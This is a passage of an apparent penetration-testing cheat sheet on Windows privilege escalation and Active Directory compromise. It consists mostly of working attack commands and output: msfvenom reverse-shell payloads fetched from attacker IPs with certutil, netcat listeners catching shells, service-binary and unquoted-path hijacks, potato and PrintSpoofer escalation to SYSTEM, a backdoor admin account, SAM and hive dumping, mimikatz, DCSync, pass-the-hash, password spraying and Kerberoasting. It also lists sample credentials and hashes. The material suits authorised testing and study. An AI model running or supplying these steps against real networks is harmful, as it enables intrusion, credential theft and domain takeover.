# Execute cmd /c C:\\Users\jess\Desktop\shell.exe
exec('cmd /c C:\\Users\jess\\Desktop\\shell.exe');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
````
nc -nlvp 443 
listening on [any] 443 ...
connect to [192.168.119.184] from (UNKNOWN) [10.11.1.252] 10209
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
jess\Admin
````
### Service Information Binary Exploitation
#### Winpeas - Interesting Services -non Microsoft-
````
auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload
File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\DevelopmentExectuables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])
````
````
icacls auditTracker.exe
auditTracker.exe Everyone:(I)(F)
		 BUILTIN\Admins:(I)(F)
		 NT AUTHORITY\SYSTEM:(I)(F)
		 BUILTIN\USERS:(I)(RX)
		 NT AUTHORITY\Authenticated Users:(I)(M)
````
#### Exploitation
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=443 -f exe -o auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables> cerutil -urlcache -split -f http://192.168.119.138:80/auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables>sc.exe start audtiTracker
nc -nlvp 443
````
### Leveraging Unquoted Service Paths
Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.

As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
#### cmd.exe
````
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
````
In this example we see than ZenHelpDesk is in program files as discussed before and has an unqouted path.
````
C:\Users\ted>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
mysql                                                                               mysql                                     C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql                          Auto       
ZenHelpDesk                                                                         Service1                                  C:\program files\zen\zen services\zen.exe                                                              Auto       

C:\Users\ted>
````
check our permission and chech which part of the path you have write access to.
````
dir /Q
dir /Q /S
````
````
C:\Program Files\Zen>dir /q
 Volume in drive C has no label.
 Volume Serial Number is 3A47-4458

 Directory of C:\Program Files\Zen

02/15/2021  02:00 PM    <DIR>          BUILTIN\Admins .
02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
02/10/2021  02:24 PM    <DIR>          BUILTIN\Admins Zen Services
03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
               1 File(s)          7,168 bytes
               3 Dir(s)   4,013,879,296 bytes free
````
Next we want to create a msfvenom file for a reverse shell and upload it to the folder where we have privledges over a file to write to. Start your netcat listner and check to see if you have shutdown privledges
````
sc stop "Some vulnerable service" #if you have permission proceed below
sc start "Some vulnerable service"#if the above worked then start the service again
sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
whoami /priv #if the above failed check to see if you have shutdown privledges
shutdown /r /t 0 #wait for a shell to comeback
````
#### Powershell service priv esc
##### Enumeration
````
https://juggernaut-sec.com/unquoted-service-paths/#:~:text=Enumerating%20Unquoted%20Service%20Paths%20by%20Downloading%20and%20Executing,bottom%20of%20the%20script%3A%20echo%20%27Invoke-AllChecks%27%20%3E%3E%20PowerUp.ps1 # follow this
````
````
cp /opt/PowerUp/PowerUp.ps1 .
````
````
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
````
````
Name               DisplayName                            StartMode PathName                                           
----               -----------                            --------- --------                                           
LSM                LSM                                    Unknown                                                      
NetSetupSvc        NetSetupSvc                            Unknown                                                      
postgresql-9.2     postgresql-9.2 - PostgreSQL Server 9.2 Auto      C:/exacqVisionEsm/PostgreSQL/9.2/bin/pg_ctl.exe ...
RemoteMouseService RemoteMouseService                     Auto      C:\Program Files (x86)\Remote Mouse\RemoteMouseS...
solrJetty          solrJetty                              Auto      C:\exacqVisionEsm\apache_solr/apache-solr\script...

````
````
move "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe.bak"
````
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
Invoke-exampleRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
````
````
get-service *exac*
stop-service ESMexampleService*
start-service ESMexampleService*
````
````
nc -nlvp 80
shutdown /r /t 0 /f #sometimes it takes a minute or two...
````


### Adding a user with high privs
````
net user hacker password /add
net localgroup Admins hacker /add
net localgroup "Remote Desktop Users" hacker /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net users #check the new user
````
````
impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
rdekstop -u hacker -p password <IP of victim machine>
windows + R #Windows and R key at the same time
[cmd.exe] # enter exe file you want in the prompt
C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Admin
[right click and run as Admin]
````
### SeImpersonate
#### JuicyPotatoNG
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=1337 EXITFUNC=thread -f exe --platform windows -o rshell.exe
cp /opt/juicyPotato/JuicyPotatoNG.exe .
````
````
PS C:\Windows\Temp> .\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe
.\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful!



nc -nlvp 1337                                                                                                                     
listening on [any] 1337 ...
connect to [192.168.119.138] from (UNKNOWN) [192.168.138.248] 52803
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
````
#### PrintSpoofer
````
whoami /priv
git clone https://github.com/dievus/printspoofer.git #copy over to victim
PrintSpoofer.exe -i -c cmd

c:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
````
````
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC

````
### Pivoting
#### psexec.py
Using credentials that we wound for USERC we were able to psexec.py on my kali machine using chisel to USERCs Account as she has higher privledges then my current user. Locally we were being blocked with psexec.exe by AV so this was our work around.
````
proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
````
````
C:\HFS>whoami
whoami
USERL\USERL
````
````
C:\Users\USERL\Desktop>net user USERL
Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
````
````
C:\Users\USERL\Desktop>net users
net users

User accounts for \\USERL

-------------------------------------------------------------------------------
Admin            USERC                    USERL                  
Guest                    
The command completed successfully
````
````
C:\Users\USERL\Desktop>net user USERC
Local Group Memberships      *Admins       
Global Group memberships     *None                 
The command completed successfully.
````
## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
### third party cheat sheet
````
https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md#AD-Lateral-Movement-1
````
### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
#### Enumeration
##### Initial Network scans
````
nmap -p80 --min-rate 1000 10.11.1.20-24 #looking for initial foothold
nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
````
##### Impacket
````
impacket-GetADUsers -dc-ip 192.168.214.122 "exampleH.example/" -all 
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Guest                                                 <never>              <never>             
rplacidi                                              2020-11-04 00:35:05.106274  <never>             
opatry                                                2020-11-04 00:35:05.216273  <never>             
ltaunton                                              2020-11-04 00:35:05.264272  <never>             
acostello                                             2020-11-04 00:35:05.315273  <never>             
jsparwell                                             2020-11-04 00:35:05.377272  <never>             
oknee                                                 2020-11-04 00:35:05.433274  <never>             
jmckendry                                             2020-11-04 00:35:05.492273  <never>             
avictoria                                             2020-11-04 00:35:05.545279  <never>             
jfrarey                                               2020-11-04 00:35:05.603273  <never>             
eaburrow                                              2020-11-04 00:35:05.652273  <never>             
cluddy                                                2020-11-04 00:35:05.703274  <never>             
agitthouse                                            2020-11-04 00:35:05.760273  <never>             
fmcsorley                                             2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491
````
###### Creds
````
impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Admin                                         2023-05-19 17:01:26.839372  2020-11-04 00:58:40.654236 
Guest                                                 <never>              <never>             
krbtgt                                                2020-11-04 00:26:23.099902  <never>             
USERA                                              2020-11-04 00:35:05.106274  <never>             
USERB                                                2020-11-04 00:35:05.216273  <never>             
USERC                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.264272  <never>             
USERD                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.315273  <never>             
jUSERE                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.377272  <never>             
USERF                                                2020-11-04 00:35:05.216273  <never>                                                              2020-11-04 00:35:05.433274  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.492273  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.545279  <never>             
USERH                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.603273  <never>             
USERI                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.652273  <never>             
USERJ                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.703274  <never>             
USERK                                                 2020-11-04 00:35:05.216273  <never>                                                         2020-11-04 00:35:05.760273  <never>             
USERL                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
domainadmin                                           2021-02-16 00:24:22.190351  2023-05-19 16:58:10.073764
````
##### Bloodhound.py
````
/opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
````
````
INFO: Found AD domain: exampleH.example
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (exampleH.example:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: exampleHdc.exampleH.example
INFO: Done in 00M 12S

````
#### Network commands
````
arp -a #look for IPs that your victim is connected
ipconfig #look for a dual victim machine, typically two $IPs shown
````
#### User Hunting
````
net users #Local users
net users /domain #All users on Domain
net users jeff /domain #Queury for more infromation on each user
net group /domain #Enumerate all groups on the domain
net group "Music Department" / domain #Enumerating specific domain group for members
````
#### Credential hunting
##### Interesting Files
````
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
````
````
tree /f C:\Users\ #look for interesting files, backups etc.
````
##### Sam, System, Security Files
````
whoami /all #BUILTIN\Admins
````
````
reg save hklm\security c:\security
reg save hklm\sam c:\sam
reg save hklm\system c:\system
````
````
copy C:\sam z:\loot
copy c:\security z:\loot
c:\system z:\loot
````
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
````
````
/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
````
````
samdump2 SYSTEM SAM                                                                                                                     
*disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
````
````
creddump7                       
creddump7 - Python tool to extract credentials and secrets from Windows registry hives
/usr/share/creddump7
├── cachedump.py
├── framework
├── lsadump.py
├── pwdump.py
└── __pycache_

./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### impacket-secretsdump
````
impacket-secretsdump Admin:'password'@$IP -outputfile hashes
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
````
$DCC2$10240#username#hash
````
````
$DCC2$10240#Admin#a7c5480e8c1ef0ffec54e99275e6e0f7
$DCC2$10240#luke#cd21be418f01f5591ac8df1fdeaa54b6
$DCC2$10240#warren#b82706aff8acf56b6c325a6c2d8c338a
$DCC2$10240#jess#464f388c3fe52a0fa0a6c8926d62059c
````
````
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt

This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password
````
##### Powershell
````
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password password123"
````
##### PowerView
````
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
````
````
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-DomainUser 
Get-DomainUser | select cn
Get-NetGroup | select name
Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
````
````
Get-NetUser -SPN #Kerberoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
````
###### Errors
````
PS C:\> Import-Module .\PowerView.ps1
Import-Module : File C:\PowerView.ps1 cannot be loaded because running scripts is disabled on this system. For more 
information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
````
````
PS C:\> powershell -exec bypass #this is how to get around it
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

Import-Module .\PowerView.ps1
PS C:\> Import-Module .\PowerView.ps1
````
##### mimikatz.exe
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
or
https://github.com/allandev5959/mimikatz-2.1.1
unzip mimikatz_trunk.zip 
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
````
privilege::debug
mimikatz token::elevate
sekurlsa::logonpasswords
sekurlsa::tickets
````
#### AD Lateral Movement
##### Network
````
nslookup #use this tool to internally find the next computer to pivot to.
example-app23.example.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
Address: 10.11.1.121
````
###### SMB
````
impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
impacket-psexec -hashes lm:ntlm zenservice@192.168.183.170
````
###### WINRM
````
evil-winrm -u <user> -p <password> -i 172.16.138.83
evil-winrm -u <user> -H <hash> -i 172.16.138.83
````
###### WMI
````
proxychains -q impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
````
###### RDP
````
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be2cnzxlcjei9cxzc9x
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
````
###### Accessing shares with RDP
````
windows + R
type: \\172.16.120.21
Enter User Name
Enter Password
[now view shares via rdp session]
````
#### AD attacks
##### Spray and Pray
````
sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec smb 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec smb 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-success
sudo proxychains crackmapexec smb 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec winrm 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
````
````
.\kerbrute_windows_amd64.exe passwordspray -d example.com .\usernames.txt "password123"
````
##### Pass-the-hash
````
crackmapexec smb 10.11.1.120-124 -u admin -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
crackmapexec smb 10.11.1.20-24 -u pat -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
crackmapexec smb 10.11.1.20-24 -u tim -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svexample.com -x whoami
proxychains crackmapexec smb 10.10.126.146 -u 'Admin' -H '59b280ba707d22e3ef0aa587fc29ffe5' -x whoami -d example.com
````
##### TGT Impersonation
````
PS> klist # should show no TGT/TGS
PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by auth to network share on the computer
PS> klist # now should show TGT/TGS
PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
````
##### AS-REP Roasting
````
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast example.com/USERP
````
````
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
.\Rubeus.exe asreproast /nowrap /outfile:hashes.asreproast
type hashes.asreproast
````
###### Cracking AS-REP Roasting
````
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Kerberoasting
````
sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 192.168.50.70 example.com/user
````
````
.\Rubeus.exe kerberoast /simple /outfile:hashes.kerberoast
````
###### Cracking Kerberoasting
````
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Domain Controller Synchronization
To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
````
lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
````
````
Credentials:
  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
````
````
impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
````
